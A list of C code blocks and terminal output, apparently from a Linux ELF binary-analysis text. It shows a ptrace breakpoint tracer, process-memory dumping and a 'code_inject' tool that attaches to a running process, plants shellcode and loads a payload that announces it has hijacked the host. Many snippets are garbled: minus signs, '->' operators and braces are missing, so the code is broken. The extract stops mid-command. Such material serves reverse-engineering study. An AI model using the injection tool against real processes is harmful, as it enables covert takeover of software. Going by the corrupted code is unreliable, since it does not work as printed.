["```\n#include <sys/ptrace.h>\nlong ptrace(enum __ptrace_request request, pid_t pid,\nvoid *addr, void *data);\n```", "```\n<sys/user.h>\nstruct user_regs_struct\n{\n  __extension__ unsigned long long int r15;\n  __extension__ unsigned long long int r14;\n  __extension__ unsigned long long int r13;\n  __extension__ unsigned long long int r12;\n  __extension__ unsigned long long int rbp;\n  __extension__ unsigned long long int rbx;\n  __extension__ unsigned long long int r11;\n  __extension__ unsigned long long int r10;\n  __extension__ unsigned long long int r9;\n  __extension__ unsigned long long int r8;\n  __extension__ unsigned long long int rax;\n  __extension__ unsigned long long int rcx;\n  __extension__ unsigned long long int rdx;\n  __extension__ unsigned long long int rsi;\n  __extension__ unsigned long long int rdi;\n  __extension__ unsigned long long int orig_rax;\n  __extension__ unsigned long long int rip;\n  __extension__ unsigned long long int cs;\n  __extension__ unsigned long long int eflags;\n  __extension__ unsigned long long int rsp;\n  __extension__ unsigned long long int ss;\n  __extension__ unsigned long long int fs_base;\n  __extension__ unsigned long long int gs_base;\n  __extension__ unsigned long long int ds;\n  __extension__ unsigned long long int es;\n  __extension__ unsigned long long int fs;\n  __extension__ unsigned long long int gs;\n};\n```", "```\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <signal.h>\n#include <elf.h>\n#include <sys/types.h>\n#include <sys/user.h>\n#include <sys/stat.h>\n#include <sys/ptrace.h>\n#include <sys/mman.h>\n\ntypedef struct handle {\n  Elf64_Ehdr *ehdr;\n  Elf64_Phdr *phdr;\n  Elf64_Shdr *shdr;\n  uint8_t *mem;\n  char *symname;\n  Elf64_Addr symaddr;\n  struct user_regs_struct pt_reg;\n  char *exec;\n} handle_t;\n\nElf64_Addr lookup_symbol(handle_t *, const char *);\n\nint main(int argc, char **argv, char **envp)\n{\n  int fd;\n  handle_t h;\n  struct stat st;\n  long trap, orig;\n  int status, pid;\n  char * args[2];\n  if (argc < 3) {\n    printf(\"Usage: %s <program> <function>\\n\", argv[0]);\n    exit(0);\n  }\n  if ((h.exec = strdup(argv[1])) == NULL) {\n    perror(\"strdup\");\n    exit(-1);\n  }\n  args[0] = h.exec;\n  args[1] = NULL;\n  if ((h.symname = strdup(argv[2])) == NULL) {\n    perror(\"strdup\");\n    exit(-1);\n  }\n  if ((fd = open(argv[1], O_RDONLY)) < 0) {\n    perror(\"open\");\n    exit(-1);\n  }\n  if (fstat(fd, &st) < 0) {\n    perror(\"fstat\");\n    exit(-1);\n  }\n  h.mem = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);\n  if (h.mem == MAP_FAILED) {\n    perror(\"mmap\");\n    exit(-1);\n  }\n  h.ehdr = (Elf64_Ehdr *)h.mem;\n  h.phdr = (Elf64_Phdr *)(h.mem + h.ehdr->e_phoff);\n  h.shdr = (Elf64_Shdr *)(h.mem + h.ehdr->e_shoff);\n  if+ (h.mem[0] != 0x7f || strcmp((char *)&h.mem[1], \"ELF\")) {\n    printf(\"%s is not an ELF file\\n\",h.exec);\n    exit(-1);\n  }\n  if (h.ehdr->e_type != ET_EXEC) {\n    printf(\"%s is not an ELF executable\\n\", h.exec);\n    exit(-1);\n  }\n  if (h.ehdr->e_shstrndx == 0 || h.ehdr->e_shoff == 0 || h.ehdr->e_shnum == 0) {\n    printf(\"Section header table not found\\n\");\n    exit(-1);\n  }\n  if ((h.symaddr = lookup_symbol(&h, h.symname)) == 0) {\n    printf(\"Unable to find symbol: %s not found in executable\\n\", h.symname);\n    exit(-1);\n  }\n  close(fd);\n  if ((pid = fork()) < 0) {\n    perror(\"fork\");\n    exit(-1);\n  }\n  if (pid == 0) {\n    if (ptrace(PTRACE_TRACEME, pid, NULL, NULL) < 0) {\n      perror(\"PTRACE_TRACEME\");\n      exit(-1);\n    }\n    execve(h.exec, args, envp);\n    exit(0);\n  }\n  wait(&status);\n  printf(\"Beginning analysis of pid: %d at %lx\\n\", pid, h.symaddr);\n  if ((orig = ptrace(PTRACE_PEEKTEXT, pid, h.symaddr, NULL)) < 0) {\n    perror(\"PTRACE_PEEKTEXT\");\n    exit(-1);\n  }\n  trap = (orig & ~0xff) | 0xcc;\n  if (ptrace(PTRACE_POKETEXT, pid, h.symaddr, trap) < 0) {\n    perror(\"PTRACE_POKETEXT\");\n    exit(-1);\n  }\n  trace:\n  if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {\n    perror(\"PTRACE_CONT\");\n    exit(-1);\n  }\n  wait(&status);\n  if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {\n    if (ptrace(PTRACE_GETREGS, pid, NULL, &h.pt_reg) < 0) {\n      perror(\"PTRACE_GETREGS\");\n      exit(-1);\n    }\n    printf(\"\\nExecutable %s (pid: %d) has hit breakpoint 0x%lx\\n\",\n    h.exec, pid, h.symaddr);\n    printf(\"%%rcx: %llx\\n%%rdx: %llx\\n%%rbx: %llx\\n\"\n    \"%%rax: %llx\\n%%rdi: %llx\\n%%rsi: %llx\\n\"\n    \"%%r8: %llx\\n%%r9: %llx\\n%%r10: %llx\\n\"\n    \"%%r11: %llx\\n%%r12 %llx\\n%%r13 %llx\\n\"\n    \"%%r14: %llx\\n%%r15: %llx\\n%%rsp: %llx\",\n    h.pt_reg.rcx, h.pt_reg.rdx, h.pt_reg.rbx,\n    h.pt_reg.rax, h.pt_reg.rdi, h.pt_reg.rsi,\n    h.pt_reg.r8, h.pt_reg.r9, h.pt_reg.r10,\n    h.pt_reg.r11, h.pt_reg.r12, h.pt_reg.r13,\n    h.pt_reg.r14, h.pt_reg.r15, h.pt_reg.rsp);\n    printf(\"\\nPlease hit any key to continue: \");\n    getchar();\n    if (ptrace(PTRACE_POKETEXT, pid, h.symaddr, orig) < 0) {\n      perror(\"PTRACE_POKETEXT\");\n      exit(-1);\n    }\n    h.pt_reg.rip = h.pt_reg.rip - 1;\n    if (ptrace(PTRACE_SETREGS, pid, NULL, &h.pt_reg) < 0) {\n      perror(\"PTRACE_SETREGS\");\n      exit(-1);\n    }\n    if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0) {\n      perror(\"PTRACE_SINGLESTEP\");\n      exit(-1);\n    }\n    wait(NULL);\n    if (ptrace(PTRACE_POKETEXT, pid, h.symaddr, trap) < 0) {\n      perror(\"PTRACE_POKETEXT\");\n      exit(-1);\n    }\n    goto trace;\n    }\n    if (WIFEXITED(status))\n    printf(\"Completed tracing pid: %d\\n\", pid);\n    exit(0);\n  }\n\n  Elf64_Addr lookup_symbol(handle_t *h, const char *symname)\n  {\n    int i, j;\n    char *strtab;\n    Elf64_Sym *symtab;\n    for (i = 0; i < h->ehdr->e_shnum; i++) {\n      if (h->shdr[i].sh_type == SHT_SYMTAB) {\n        strtab = (char *)&h->mem[h->shdr[h->shdr[i].sh_link].sh_offset];\n        symtab = (Elf64_Sym *)&h->mem[h->shdr[i].sh_offset];\n        for (j = 0; j < h->shdr[i].sh_size/sizeof(Elf64_Sym); j++) {\n          if(strcmp(&strtab[symtab->st_name], symname) == 0)\n          return (symtab->st_value);\n          symtab++;\n        }\n      }\n    }\n  return 0;\n  }\n}\n```", "```\ngcc tracer.c \u2013o tracer\n\n```", "```\n$ ./tracer ./test print_string\nBeginning analysis of pid: 6297 at 40057d\nExecutable ./test (pid: 6297) has hit breakpoint 0x40057d\n%rcx: 0\n%rdx: 7fff4accbf18\n%rbx: 0\n%rax: 400597\n%rdi: 400644\n%rsi: 7fff4accbf08\n%r8: 7fd4f09efe80\n%r9: 7fd4f0a05560\n%r10: 7fff4accbcb0\n%r11: 7fd4f0650dd0\n%r12 400490\n%r13 7fff4accbf00\n%r14: 0\n%r15: 0\n%rsp: 7fff4accbe18\nPlease hit any key to continue: c\nHello 1\nExecutable ./test (pid: 6297) has hit breakpoint 0x40057d\n%rcx: ffffffffffffffff\n%rdx: 7fd4f09f09e0\n%rbx: 0\n%rax: 9\n%rdi: 40064d\n%rsi: 7fd4f0c14000\n%r8: ffffffff\n%r9: 0\n%r10: 22\n%r11: 246\n%r12 400490\n%r13 7fff4accbf00\n%r14: 0\n%r15: 0\n%rsp: 7fff4accbe18\nHello 2\nPlease hit any key to continue: Completed tracing pid: 6297\n\n```", "```\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <signal.h>\n#include <elf.h>\n#include <sys/types.h>\n#include <sys/user.h>\n#include <sys/stat.h>\n#include <sys/ptrace.h>\n#include <sys/mman.h>\n\ntypedef struct handle {\n  Elf64_Ehdr *ehdr;\n  Elf64_Phdr *phdr;\n  Elf64_Shdr *shdr;\n  uint8_t *mem;\n  char *symname;\n  Elf64_Addr symaddr;\n  struct user_regs_struct pt_reg;\n  char *exec;\n} handle_t;\n\nint global_pid;\nElf64_Addr lookup_symbol(handle_t *, const char *);\nchar * get_exe_name(int);\nvoid sighandler(int);\n#define EXE_MODE 0\n#define PID_MODE 1\n\nint main(int argc, char **argv, char **envp)\n{\n  int fd, c, mode = 0;\n  handle_t h;\n  struct stat st;\n  long trap, orig;\n  int status, pid;\n  char * args[2];\n\n    printf(\"Usage: %s [-ep <exe>/<pid>]\n    [f <fname>]\\n\", argv[0]);\n\n  memset(&h, 0, sizeof(handle_t));\n  while ((c = getopt(argc, argv, \"p:e:f:\")) != -1)\n  {\n  switch(c) {\n    case 'p':\n    pid = atoi(optarg);\n    h.exec = get_exe_name(pid);\n    if (h.exec == NULL) {\n      printf(\"Unable to retrieve executable path for pid: %d\\n\",\n      pid);\n      exit(-1);\n    }\n    mode = PID_MODE;\n    break;\n    case 'e':\n    if ((h.exec = strdup(optarg)) == NULL) {\n      perror(\"strdup\");\n      exit(-1);\n    }\n    mode = EXE_MODE;\n    break;\n    case 'f':\n    if ((h.symname = strdup(optarg)) == NULL) {\n      perror(\"strdup\");\n      exit(-1);\n    }\n    break;\n    default:\n    printf(\"Unknown option\\n\");\n    break;\n  }\n}\nif (h.symname == NULL) {\n  printf(\"Specifying a function name with -f\n  option is required\\n\");\n  exit(-1);\n}\nif (mode == EXE_MODE) {\n  args[0] = h.exec;\n  args[1] = NULL;\n}\nsignal(SIGINT, sighandler);\nif ((fd = open(h.exec, O_RDONLY)) < 0) {\n  perror(\"open\");\n  exit(-1);\n}\nif (fstat(fd, &st) < 0) {\n  perror(\"fstat\");\n  exit(-1);\n}\nh.mem = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);\nif (h.mem == MAP_FAILED) {\n  perror(\"mmap\");\n  exit(-1);\n}\nh.ehdr = (Elf64_Ehdr *)h.mem;\nh.phdr = (Elf64_Phdr *)(h.mem + h.ehdr>\nh.shdr = (Elf64_Shdr *)(h.mem + h.ehdr>\n\nif (h.mem[0] != 0x7f &&!strcmp((char *)&h.mem[1], \"ELF\")) {\n  printf(\"%s is not an ELF file\\n\",h.exec);\n  exit(-1);\n}\nif (h.ehdr>e_type != ET_EXEC) {\n  printf(\"%s is not an ELF executable\\n\", h.exec);\n  exit(-1);\n}\nif (h.ehdr->e_shstrndx == 0 || h.ehdr->e_shoff == 0 || h.ehdr->e_shnum == 0) {\n  printf(\"Section header table not found\\n\");\n  exit(-1);\n}\nif ((h.symaddr = lookup_symbol(&h, h.symname)) == 0) {\n  printf(\"Unable to find symbol: %s not found in executable\\n\", h.symname);\n  exit(-1);\n}\nclose(fd);\nif (mode == EXE_MODE) {\n  if ((pid = fork()) < 0) {\n    perror(\"fork\");\n    exit(-1);\n  }\n  if (pid == 0) {\n    if (ptrace(PTRACE_TRACEME, pid, NULL, NULL) < 0) {\n      perror(\"PTRACE_TRACEME\");\n      exit(-1);\n    }\n    execve(h.exec, args, envp);\n    exit(0);\n  }\n} else { // attach to the process 'pid'\n  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {\n    perror(\"PTRACE_ATTACH\");\n    exit(-1);\n  }\n}\nwait(&status); // wait tracee to stop\nglobal_pid = pid;\nprintf(\"Beginning analysis of pid: %d at %lx\\n\", pid, h.symaddr);\n// Read the 8 bytes at h.symaddr\nif ((orig = ptrace(PTRACE_PEEKTEXT, pid, h.symaddr, NULL)) < 0) {\n  perror(\"PTRACE_PEEKTEXT\");\n  exit(-1);\n}\n\n// set a break point\ntrap = (orig & ~0xff) | 0xcc;\nif (ptrace(PTRACE_POKETEXT, pid, h.symaddr, trap) < 0) {\n  perror(\"PTRACE_POKETEXT\");\n  exit(-1);\n}\n// Begin tracing execution\ntrace:\nif (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {\n  perror(\"PTRACE_CONT\");\n  exit(-1);\n}\nwait(&status);\n\n/*\n    * If we receive a SIGTRAP then we presumably hit a break\n    * Point instruction. In which case we will print out the\n    *current register state.\n*/\nif (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {\n  if (ptrace(PTRACE_GETREGS, pid, NULL, &h.pt_reg) < 0) {\n    perror(\"PTRACE_GETREGS\");\n    exit(-1);\n  }\n  printf(\"\\nExecutable %s (pid: %d) has hit breakpoint 0x%lx\\n\", h.exec, pid, h.symaddr);\n  printf(\"%%rcx: %llx\\n%%rdx: %llx\\n%%rbx: %llx\\n\"\n  \"%%rax: %llx\\n%%rdi: %llx\\n%%rsi: %llx\\n\"\n  \"%%r8: %llx\\n%%r9: %llx\\n%%r10: %llx\\n\"\n  \"%%r11: %llx\\n%%r12 %llx\\n%%r13 %llx\\n\"\n  \"%%r14: %llx\\n%%r15: %llx\\n%%rsp: %llx\",\n  h.pt_reg.rcx, h.pt_reg.rdx, h.pt_reg.rbx,\n  h.pt_reg.rax, h.pt_reg.rdi, h.pt_reg.rsi,\n  h.pt_reg.r8, h.pt_reg.r9, h.pt_reg.r10,\n  h.pt_reg.r11, h.pt_reg.r12, h.pt_reg.r13,\n  h.pt_reg.r14, h.pt_reg.r15, h.pt_reg.rsp);\n  printf(\"\\nPlease hit any key to continue: \");\n  getchar();\n  if (ptrace(PTRACE_POKETEXT, pid, h.symaddr, orig) < 0) {\n    perror(\"PTRACE_POKETEXT\");\n    exit(-1);\n  }\n  h.pt_reg.rip = h.pt_reg.rip 1;\n  if (ptrace(PTRACE_SETREGS, pid, NULL, &h.pt_reg) < 0) {\n    perror(\"PTRACE_SETREGS\");\n  exit(-1);\n  }\n  if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0) {\n    perror(\"PTRACE_SINGLESTEP\");\n    exit(-1);\n  }\n  wait(NULL);\n  if (ptrace(PTRACE_POKETEXT, pid, h.symaddr, trap) < 0) {\n    perror(\"PTRACE_POKETEXT\");\n    exit(-1);\n  }\n  goto trace;\n}\nif (WIFEXITED(status)){\n  printf(\"Completed tracing pid: %d\\n\", pid);\n  exit(0);\n}\n\n/* This function will lookup a symbol by name, specifically from\n * The .symtab section, and return the symbol value.\n */\n\nElf64_Addr lookup_symbol(handle_t *h, const char *symname)\n{\n  int i, j;\n  char *strtab;\n  Elf64_Sym *symtab;\n  for (i = 0; i < h->ehdr->e_shnum; i++) {\n    if (h->shdr[i].sh_type == SHT_SYMTAB) {\n      strtab = (char *)\n      &h->mem[h->shdr[h->shdr[i].sh_link].sh_offset];\n      symtab = (Elf64_Sym *)\n      &h->mem[h->shdr[i].sh_offset];\n      for (j = 0; j < h>\n      shdr[i].sh_size/sizeof(Elf64_Sym); j++) {\n        if(strcmp(&strtab[symtab->st_name], symname) == 0)\n        return (symtab->st_value);\n        symtab++;\n      }\n    }\n  }\n  return 0;\n}\n\n/*\n* This function will parse the cmdline proc entry to retrieve\n* the executable name of the process.\n*/\nchar * get_exe_name(int pid)\n{\n  char cmdline[255], path[512], *p;\n  int fd;\n  snprintf(cmdline, 255, \"/proc/%d/cmdline\", pid);\n  if ((fd = open(cmdline, O_RDONLY)) < 0) {\n    perror(\"open\");\n    exit(-1);\n  }\n  if (read(fd, path, 512) < 0) {\n    perror(\"read\");\n    exit(-1);\n  }\n  if ((p = strdup(path)) == NULL) {\n    perror(\"strdup\");\n    exit(-1);\n  }\n  return p;\n}\nvoid sighandler(int sig)\n{\n  printf(\"Caught SIGINT: Detaching from %d\\n\", global_pid);\n  if (ptrace(PTRACE_DETACH, global_pid, NULL, NULL) < 0 && errno) {\n    perror(\"PTRACE_DETACH\");\n    exit(-1);\n  }\n  exit(0);\n}\n```", "```\nryan@elfmaster:~$ ./tracer -p `pidof ./test2` -f print_string\nBeginning analysis of pid: 7075 at 4005bd\nExecutable ./test2 (pid: 7075) has hit breakpoint 0x4005bd\n%rcx: ffffffffffffffff\n%rdx: 0\n%rbx: 0\n%rax: 0\n%rdi: 4006a4\n%rsi: 7fffe93670e0\n%r8: 7fffe93671f0\n%r9: 0\n%r10: 8\n%r11: 246\n%r12 4004d0\n%r13 7fffe93673b0\n%r14: 0\n%r15: 0\n%rsp: 7fffe93672b8\nPlease hit any key to continue: c\nExecutable ./test2 (pid: 7075) has hit breakpoint 0x4005bd\n%rcx: ffffffffffffffff\n%rdx: 0\n%rbx: 0\n%rax: 0\n%rdi: 4006a4\n%rsi: 7fffe93670e0\n%r8: 7fffe93671f0\n%r9: 0\n%r10: 8\n%r11: 246\n%r12 4004d0\n%r13 7fffe93673b0\n%r14: 0\n%r15: 0\n%rsp: 7fffe93672b8\n^C\nCaught SIGINT: Detaching from 7452\n\n```", "```\n    [First line of output from /proc/<pid>/maps file for program 'evil']\n\n    00400000-401000 r-xp /home/ryan/evil\n\n    ```", "```\n    [Source code for pid_read() function]\n    int pid_read(int pid, void *dst, const void *src, size_t len)\n    {\n      int sz = len / sizeof(void *);\n      unsigned char *s = (unsigned char *)src;\n      unsigned char *d = (unsigned char *)dst;\n      unsigned long word;\n      while (sz!=0) {\n        word = ptrace(PTRACE_PEEKTEXT, pid, (long *)s, NULL);\n        if (word == 1)\n        return 1;\n        *(long *)d = word;\n        s += sizeof(long);\n        d += sizeof(long);\n      }\n      return 0;\n    }\n    ```", "```\n    /* Where buffer is the buffer holding the text segment */\n    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)buffer;\n    Elf64_Phdr *phdr = (Elf64_Phdr *)&buffer[ehdr->e_phoff];\n    ```", "```\n    for (c = 0; c < ehdr>e_phnum; c++)\n    if (phdr[c].p_type == PT_LOAD && phdr[c].p_offset) {\n      dataVaddr = phdr[c].p_vaddr;\n      dataSize = phdr[c].p_memsz;\n      break;\n    }\n    pid_read(pid, databuff, dataVaddr, dataSize);\n    ```", "```\n    Elf64_Dyn *dyn;\n    for (c = 0; c < ehdr->e_phnum; c++) {\n      if (phdr[c].p_type == PT_DYNAMIC) {\n        dyn = (Elf64_Dyn *)&databuff[phdr[c].p_vaddr \u2013 dataAddr];\n        break;\n      }\n      if (dyn) {\n        for (c = 0; dyn[c].d_tag != DT_NULL; c++) {\n          switch(dyn[c].d_tag) {\n            case DT_PLTGOT:\n            gotAddr = dyn[i].d_un.d_ptr;\n            break;\n            case DT_STRTAB:\n            /* Get .dynstr info */\n            break;\n            case DT_SYMTAB:\n            /* Get .dynsym info */\n            break;\n          }\n        }\n      }\n    ```", "```\n    00000000004003e0 <puts@plt>:\n    4003e0: ff 25 32 0c 20 00 jmpq *0x200c32(%rip) # 601018 \n    4003e6: 68 00 00 00 00 pushq $0x0\n    4003eb: e9 e0 ff ff ff jmpq 4003d0 <_init+0x28>\n\n    ```", "```\n[Quenya v0.1@ELFWorkshop]\nrebuild 2497 dumpme.out\n[+] Beginning analysis for executable reconstruction of process image (pid: 2497)\n[+] Getting Loadable segment info...\n[+] Found loadable segments: text segment, data segment\nLocated PLT GOT Vaddr 0x804a000\nRelevant GOT entries begin at 0x804a00c\n[+] Resolved PLT: 0x8048336\nPLT Entries: 5\nPatch #1 [\n0xb75f7040] changed to [0x8048346]\nPatch #2 [\n0xb75a7190] changed to [0x8048356]\nPatch #3 [\n0x8048366] changed to [0x8048366]\nPatch #4 [\n0xb755a990] changed to [0x8048376]\n[+] Patched GOT with PLT stubs\nSuccessfully rebuilt ELF object from memory\nOutput executable location: dumpme.out\n[Quenya v0.1@ELFWorkshop]\nquit\n```", "```\nhacker@ELFWorkshop:~/\nworkshop/labs/exercise_9$ ./dumpme.out\nYou can Dump my segments!\n\n```", "```\nhacker@ELFWorkshop:~/\nworkshop/labs/exercise_9$ readelf -S\ndumpme.out\n\n```", "```\nTo compile: gcc code_inject.c o code_inject\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <signal.h>\n#include <elf.h>\n#include <sys/types.h>\n#include <sys/user.h>\n#include <sys/stat.h>\n#include <sys/ptrace.h>\n#include <sys/mman.h>\n#define PAGE_ALIGN(x) (x & ~(PAGE_SIZE 1))\n#define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE)\n#define WORD_ALIGN(x) ((x + 7) & ~7)\n#define BASE_ADDRESS 0x00100000\ntypedef struct handle {\n  Elf64_Ehdr *ehdr;\n  Elf64_Phdr *phdr;\n  Elf64_Shdr *shdr;\n  uint8_t *mem;\n  pid_t pid;\n  uint8_t *shellcode;\n  char *exec_path;\n  uint64_t base;\n  uint64_t stack;\n  uint64_t entry;\n  struct user_regs_struct pt_reg;\n} handle_t;\n\nstatic inline volatile void *\nevil_mmap(void *, uint64_t, uint64_t, uint64_t, int64_t, uint64_t)\n__attribute__((aligned(8),__always_inline__));\nuint64_t injection_code(void *) __attribute__((aligned(8)));\nuint64_t get_text_base(pid_t);\nint pid_write(int, void *, const void *, size_t);\nuint8_t *create_fn_shellcode(void (*fn)(), size_t len);\n\nvoid *f1 = injection_code;\nvoid *f2 = get_text_base;\n\nstatic inline volatile long evil_write(long fd, char *buf, unsigned long len)\n{\n  long ret;\n  __asm__ volatile(\n    \"mov %0, %%rdi\\n\"\n    \"mov %1, %%rsi\\n\"\n    \"mov %2, %%rdx\\n\"\n    \"mov $1, %%rax\\n\"\n    \"syscall\" : : \"g\"(fd), \"g\"(buf), \"g\"(len));\n  asm(\"mov %%rax, %0\" : \"=r\"(ret));\n  return ret;\n}\n\nstatic inline volatile int evil_fstat(long fd, struct stat *buf)\n{\n  long ret;\n  __asm__ volatile(\n    \"mov %0, %%rdi\\n\"\n    \"mov %1, %%rsi\\n\"\n    \"mov $5, %%rax\\n\"\n    \"syscall\" : : \"g\"(fd), \"g\"(buf));\n  asm(\"mov %%rax, %0\" : \"=r\"(ret));\n  return ret;\n}\n\nstatic inline volatile int evil_open(const char *path, unsigned long flags)\n{\n  long ret;\n  __asm__ volatile(\n    \"mov %0, %%rdi\\n\"\n    \"mov %1, %%rsi\\n\"\n    \"mov $2, %%rax\\n\"\n    \"syscall\" : : \"g\"(path), \"g\"(flags));\n    asm (\"mov %%rax, %0\" : \"=r\"(ret));\n  return ret;\n}\n\nstatic inline volatile void * evil_mmap(void *addr, uint64_t len, uint64_t prot, uint64_t flags, int64_t fd, uint64_t off)\n{\n  long mmap_fd = fd;\n  unsigned long mmap_off = off;\n  unsigned long mmap_flags = flags;\n  unsigned long ret;\n  __asm__ volatile(\n    \"mov %0, %%rdi\\n\"\n    \"mov %1, %%rsi\\n\"\n    \"mov %2, %%rdx\\n\"\n    \"mov %3, %%r10\\n\"\n    \"mov %4, %%r8\\n\"\n    \"mov %5, %%r9\\n\"\n    \"mov $9, %%rax\\n\"\n    \"syscall\\n\" : : \"g\"(addr), \"g\"(len), \"g\"(prot), \"g\"(flags),\n    \"g\"(mmap_fd), \"g\"(mmap_off));\n  asm (\"mov %%rax, %0\" : \"=r\"(ret));\n  return (void *)ret;\n}\n\nuint64_t injection_code(void * vaddr)\n{\n  volatile void *mem;\n  mem = evil_mmap(vaddr,8192,\n  PROT_READ|PROT_WRITE|PROT_EXEC,\n  MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,1,0);\n  __asm__ __volatile__(\"int3\");\n}\n\n#define MAX_PATH 512\n\nuint64_t get_text_base(pid_t pid)\n{\n  char maps[MAX_PATH], line[256];\n  char *start, *p;\n  FILE *fd;\n  int i;\n  Elf64_Addr base;\n  snprintf(maps, MAX_PATH 1,\n  \"/proc/%d/maps\", pid);\n  if ((fd = fopen(maps, \"r\")) == NULL) {\n    fprintf(stderr, \"Cannot open %s for reading: %s\\n\", maps, strerror(errno));\n    return 1;\n  }\n  while (fgets(line, sizeof(line), fd)) {\n    if (!strstr(line, \"rxp\"))\n    continue;\n    for (i = 0, start = alloca(32), p = line; *p != ''; i++, p++)\n    start[i] = *p;\n\n    start[i] = '\\0';\n    base = strtoul(start, NULL, 16);\n    break;\n  }\n  fclose(fd);\n  return base;\n}\n\nuint8_t * create_fn_shellcode(void (*fn)(), size_t len)\n{\n  size_t i;\n  uint8_t *shellcode = (uint8_t *)malloc(len);\n  uint8_t *p = (uint8_t *)fn;\n  for (i = 0; i < len; i++)\n  *(shellcode + i) = *p++;\n  return shellcode;\n}\n\nint pid_read(int pid, void *dst, const void *src, size_t len)\n{\n  int sz = len / sizeof(void *);\n  unsigned char *s = (unsigned char *)src;\n  unsigned char *d = (unsigned char *)dst;\n  long word;\n  while (sz!=0) {\n    word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);\n    if (word == 1 && errno) {\n      fprintf(stderr, \"pid_read failed, pid: %d: %s\\n\", pid,strerror(errno));\n      goto fail;\n    }\n    *(long *)d = word;\n    s += sizeof(long);\n    d += sizeof(long);\n  }\n  return 0;\n  fail:\n  perror(\"PTRACE_PEEKTEXT\");\n  return 1;\n}\n\nint pid_write(int pid, void *dest, const void *src, size_t len)\n{\n  size_t quot = len / sizeof(void *);\n  unsigned char *s = (unsigned char *) src;\n  unsigned char *d = (unsigned char *) dest;\n  while (quot!= 0) {\n    if ( ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) == 1)\n    goto out_error;\n    s += sizeof(void *);\n    d += sizeof(void *);\n  }\n  return 0;\n  out_error:\n  perror(\"PTRACE_POKETEXT\");\n  return 1;\n}\n\nint main(int argc, char **argv)\n{\n  handle_t h;\n  unsigned long shellcode_size = f2 f1;\n  int i, fd, status;\n  uint8_t *executable, *origcode;\n  struct stat st;\n  Elf64_Ehdr *ehdr;\n  if (argc < 3) {\n    printf(\"Usage: %s <pid> <executable>\\n\", argv[0]);\n    exit(1);\n  }\n  h.pid = atoi(argv[1]);\n  h.exec_path = strdup(argv[2]);\n  if (ptrace(PTRACE_ATTACH, h.pid) < 0) {\n    perror(\"PTRACE_ATTACH\");\n    exit(1);\n  }\n  wait(NULL);\n  h.base = get_text_base(h.pid);\n  shellcode_size += 8;\n  h.shellcode = create_fn_shellcode((void *)&injection_code, shellcode_size);\n  origcode = alloca(shellcode_size);\n  if (pid_read(h.pid, (void *)origcode, (void *)h.base, shellcode_size) < 0)\n  exit(1);\n  if (pid_write(h.pid, (void *)h.base, (void *)h.shellcode, shellcode_size) < 0)\n  exit(1);\n  if (ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0) {\n    perror(\"PTRACE_GETREGS\");\n    exit(1);\n  }\n  h.pt_reg.rip = h.base;\n  h.pt_reg.rdi = BASE_ADDRESS;\n  if (ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0) {\n    perror(\"PTRACE_SETREGS\");\n    exit(1);\n  }\n  if (ptrace(PTRACE_CONT, h.pid, NULL, NULL) < 0) {\n    perror(\"PTRACE_CONT\");\n    exit(1);\n  }\n  wait(&status);\n  if (WSTOPSIG(status) != SIGTRAP) {\n    printf(\"Something went wrong\\n\");\n    exit(1);\n  }\n  if (pid_write(h.pid, (void *)h.base, (void *)origcode, shellcode_size) < 0)\n  exit(1);\n  if ((fd = open(h.exec_path, O_RDONLY)) < 0) {\n    perror(\"open\");\n    exit(1);\n  }\n  if (fstat(fd, &st) < 0) {\n    perror(\"fstat\");\n    exit(1);\n  }\n  executable = malloc(WORD_ALIGN(st.st_size));\n  if (read(fd, executable, st.st_size) < 0) {\n    perror(\"read\");\n    exit(1);\n  }\n  ehdr = (Elf64_Ehdr *)executable;\n  h.entry = ehdr->e_entry;\n  close(fd);\n  if (pid_write(h.pid, (void *)BASE_ADDRESS, (void *)executable, st.st_size) < 0)\n  exit(1);\n  if (ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0) {\n    perror(\"PTRACE_GETREGS\");\n    exit(1);\n  }\n  h.entry = BASE_ADDRESS + h.entry;\n  h.pt_reg.rip = h.entry;\n  if (ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0) {\n    perror(\"PTRACE_SETREGS\");\n    exit(1);\n  }\n  if (ptrace(PTRACE_DETACH, h.pid, NULL, NULL) < 0) {\n    perror(\"PTRACE_CONT\");\n    exit(1);\n  }\n  wait(NULL);\n  exit(0);\n}\n```", "```\nTo Compile: gcc -fpic -pie -nostdlib payload.c -o payload\n\nlong _write(long fd, char *buf, unsigned long len)\n{\n  long ret;\n  __asm__ volatile(\n    \"mov %0, %%rdi\\n\"\n    \"mov %1, %%rsi\\n\"\n    \"mov %2, %%rdx\\n\"\n    \"mov $1, %%rax\\n\"\n    \"syscall\" : : \"g\"(fd), \"g\"(buf), \"g\"(len));\n  asm(\"mov %%rax, %0\" : \"=r\"(ret));\n  return ret;\n}\n\nvoid Exit(long status)\n{\n  __asm__ volatile(\"mov %0, %%rdi\\n\"\n  \"mov $60, %%rax\\n\"\n  \"syscall\" : : \"r\"(status));\n}\n\n_start()\n{\n  _write(1, \"I am the payload who has hijacked your process!\\n\", 48);\n  Exit(0);\n}\n```", "```\n    ryan@elfmaster:~$ ./host &\n    [1] 29656\n    I am but a simple program, please don't infect me.\n\n    ```", "```\n    ryan@elfmaster:~$ ./code_inject `pidof host` 